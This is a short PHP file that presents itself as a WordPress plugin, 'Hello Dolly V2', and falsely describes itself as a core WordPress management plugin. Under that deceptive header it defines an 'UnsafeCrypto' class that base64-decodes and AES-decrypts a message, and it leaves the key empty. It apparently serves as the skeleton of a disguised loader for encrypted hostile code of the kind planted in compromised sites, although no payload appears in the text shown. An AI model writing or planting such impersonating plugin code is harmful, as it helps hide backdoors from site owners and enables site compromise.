<?php
/**
 * @package Hello Dolly V2
 * @version 1.0.1
 */
/*
Plugin Name: Hello Dolly V2
Plugin URI: https://wordpress.org/plugins/
Description: This is core plugin for managment WordPress.
Version: 1.0.1
Author URI: https://wordpress.org/
*/
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
class UnsafeCrypto
{
 const METHOD = 'aes-256-ctr';
 public static function decrypt($message, $nonce, $key, $encoded = false)
 {
  if ($encoded) {
   $message = base64_decode($message, true);
   $nonce = base64_decode($nonce, true);
   if ($message === false || $nonce === false) {
        throw new Exception('Encryption failure');
   }

  }

  $plaintext = openssl_decrypt(
   $message,
   self::METHOD,
   $key,
   OPENSSL_RAW_DATA,
   $nonce
  );
            
  return $plaintext;
 }
}

$key='';
?>